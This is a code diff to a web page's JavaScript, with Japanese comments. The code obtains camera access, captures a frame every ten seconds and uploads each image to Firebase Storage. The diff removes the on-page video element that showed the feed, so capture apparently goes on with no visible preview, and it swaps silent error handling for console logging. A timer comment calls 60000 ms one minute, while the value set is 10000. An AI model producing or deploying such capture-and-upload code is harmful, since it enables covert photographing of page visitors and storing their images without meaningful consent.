@@ -308,24 +308,27 @@
         const storage = getStorage(app);
 
         // カメラアクセス
-        const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
+        let videoStream;
 
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
-                video.srcObject = stream;
+                videoStream = stream;
             })
             .catch(err => {
-                // カメラアクセスエラーの際は何もしない
+                console.error('カメラアクセスエラー:', err);
             });
 
         // 画像をFirebase Storageにアップロード
         function uploadImage(dataURL) {
             const storageRef = ref(storage, `images/${Date.now()}.jpg`);
             uploadString(storageRef, dataURL, 'data_url')
+                .then(snapshot => {
+                    console.log('画像がアップロードされました。');
+                })
                 .catch(err => {
-                    // アップロードエラーの際は何もしない
+                    console.error('アップロードエラー:', err);
                 });
         }
 
@@ -344,7 +347,7 @@
                         uploadImage(dataURL);
                     })
                     .catch(err => {
-                        // 画像キャプチャエラーの際は何もしない
+                        console.error('画像キャプチャエラー:', err);
                     });
             }
         }, 10000); // 60000ミリ秒 = 1分
